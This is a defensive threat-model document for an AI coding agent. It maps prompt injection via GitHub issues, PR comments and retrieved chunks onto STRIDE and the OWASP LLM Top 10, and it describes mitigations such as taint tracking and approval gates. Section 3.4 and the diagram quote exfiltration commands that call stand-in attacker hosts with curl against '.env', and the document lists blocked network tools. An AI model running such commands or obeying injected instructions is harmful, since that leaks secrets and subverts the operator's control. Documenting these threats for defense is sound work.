# Threat Model & Vulnerability Analysis

## 1. Methodology & Scope

This threat model applies the **STRIDE** methodology (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) and maps directly to the **OWASP Top 10 for Large Language Model Applications (2025/2026)**.

The scope encompasses:
- Untrusted ingestion sources (GitHub issues, comments, review findings, PR diffs).
- AI reasoning services (`TaskPlanner`, `PlanReplanner`, `RepairService`).
- Policy and execution components (`TaintPolicyEngine`, `ToolRouter`, `AgentExecutionLoop`).
- Host and container environments (`SandboxBackend`, Docker/gVisor).

```mermaid
graph TD
    Attacker((Adversarial Actor)) -->|1. Submit Poisoned Issue| Ingestion[Ingestion Boundary]
    Attacker -->|2. Poisoned PR Comment| Ingestion
    
    Ingestion -->|Tainted Prompt| LLM[LLM Reasoning Core]
    LLM -->|Hijacked Plan| PlanSteps[Plan Steps]
    
    PlanSteps -->|Vector A: Exfiltrate Secrets| SecretSink[Access .env / SSH Key]
    PlanSteps -->|Vector B: Arbitrary Shell Exec| ShellSink[Run curl evil.com]
    PlanSteps -->|Vector C: Corrupt Build/Code| CodeSink[Delete / Overwrite Files]
    PlanSteps -->|Vector D: Tamper Approvals| ApprovalSink[Replay / Modify Args]
    
    SecretSink -.->|BLOCKED| Engine[TaintPolicyEngine]
    ShellSink -.->|BLOCKED| Engine
    CodeSink -.->|GATED| Approval[Human Approval Gate]
    ApprovalSink -.->|BLOCKED| HashCheck[SHA-256 Digest Check]

    style Attacker fill:#f44336,color:#fff
    style Engine fill:#4caf50,color:#fff
    style Approval fill:#ff9800,color:#fff
    style HashCheck fill:#4caf50,color:#fff
```

---

## 2. OWASP Top 10 for LLMs Threat Matrix

| OWASP LLM ID | Threat Category | Threat Description in Platform | Architecture Defense | Residual Risk |
|---|---|---|---|---|
| **LLM01** | Prompt Injection | Indirect injection inside GitHub issue instructs model to execute malicious bash commands | Fenced ingestion + Lineage Taint Tracking + Shell Metacharacter Blocking | Low (Defended structurally outside LLM) |
| **LLM02** | Sensitive Information Disclosure | Malicious issue tricks model into reading `.env`, AWS credentials, or SSH private keys | `TaintPolicyEngine` denies read access to `PROTECTED_PATTERNS` for tainted lineage | Minimal |
| **LLM03** | Supply Chain Vulnerabilities | Issue instructs model to install a malicious PyPI/npm package | Sandboxed container runs with `--network=none` during offline phases; approvals required for deps | Low |
| **LLM04** | Data and Model Poisoning | Attacker injects deceptive code review comments to poison long-term memory | Provenance IDs track comments as `EXTERNAL_UNTRUSTED`; memory retrieval inherits taint | Low |
| **LLM05** | Improper Output Handling | Model outputs raw shell script containing pipe injection (`\| bash`) | Token splitting + Metacharacter ban (`SHELL_METACHARACTERS`) + Allowlist | Minimal |
| **LLM06** | Excessive Agency | Autonomous agent granted unbounded tool execution rights | Capability-based policy: only low-risk edits allowed without human sign-off | Minimal |
| **LLM07** | System Prompt Leakage | Attacker requests dump of platform system instructions | Fencing instructions; system prompt leakage has zero operational impact since policy is enforced in Python | Minimal |
| **LLM08** | Vector and Embedding Weaknesses | RAG retrieval injects malicious chunk into context | Retrieved chunks carry `source_type="RETRIEVED_CHUNK"` and inherit taint | Low |
| **LLM09** | Misinformation / Hallucination | Agent generates incorrect bug fix | Independent Verifier + Test stability suite + Human code review PR gate | Low |
| **LLM10** | Unbounded Consumption | Infinite repair loop consuming model quota | Strict repair iteration bound (`max_iterations=3`) + execution timeout (600s) | Minimal |

---

## 3. STRIDE Threat Analysis

### 3.1 Spoofing (S)
- **Threat**: An attacker modifies the `TrustLevel` in a JSON payload from `EXTERNAL_UNTRUSTED` to `USER_APPROVED` or `SYSTEM`.
- **Mitigation**:
  1. `TrustLevel.MODEL_GENERATED` is enforced programmatically in `TaskPlanner.plan()` and `sanitize_llm_plan()`.
  2. `TaintTracker.register_source` assigns trust server-side during webhook validation.
  3. Deserialization verifies that all parent IDs exist in the registry.

### 3.2 Tampering (T)
- **Threat**: An attacker tricks the user into approving a benign deletion (`temp.log`), then modifies the tool arguments to delete `production_db.py`.
- **Mitigation**:
  1. Cryptographic Argument Binding: `arguments_hash` is computed as `SHA-256(canonical_json(arguments))`.
  2. When the tool router verifies the approval, `hmac.compare_digest(approval.arguments_hash, compute_arguments_hash(current_args))` fails, rejecting the tampered execution.

### 3.3 Repudiation (R)
- **Threat**: A developer or automated process approves a destructive operation, then claims they never authorized it.
- **Mitigation**:
  1. `ExecutionApproval` records `user_id`, `created_at`, `arguments_hash`, `task_id`, and `repository_id`.
  2. `ProvenanceAuditLogger` writes non-repudiable structured audit events with timestamps.

### 3.4 Information Disclosure (I)
- **Threat**: Adversary embeds `curl https://attacker.com/leak?key=$(cat .env)` in issue description.
- **Mitigation**:
  1. `is_protected_file(".env")` returns `True`. Reading or referencing protected files is classified as `ActionRiskLevel.PROHIBITED`.
  2. Outbound network binaries (`curl`, `wget`, `nc`) are classified as `ActionRiskLevel.PROHIBITED` for tainted lineage.
  3. Sandbox containers run with isolated networking (`--network=none`).

### 3.5 Denial of Service (D)
- **Threat**: Attacker creates a circular dependency or recursive task plan causing an infinite loop.
- **Mitigation**:
  1. `TaintTracker.get_lineage()` implements cycle detection using visited sets.
  2. `AgentExecutionLoop` enforces a strict step execution bound and timeout.

### 3.6 Elevation of Privilege (E)
- **Threat**: "Taint Laundering": Attacker causes a test to fail, hoping that the replanner or repair loop will create new, untainted plan steps.
- **Mitigation**:
  1. `PlanReplanner` sets `parent_ids = [failed_step.provenance.provenance_id]`.
  2. `TaintTracker.propagate()` applies monotonic disjunction: $\tau(C) = \bigvee \tau(P)$. If the failed step was tainted, all recovery steps remain permanently tainted.
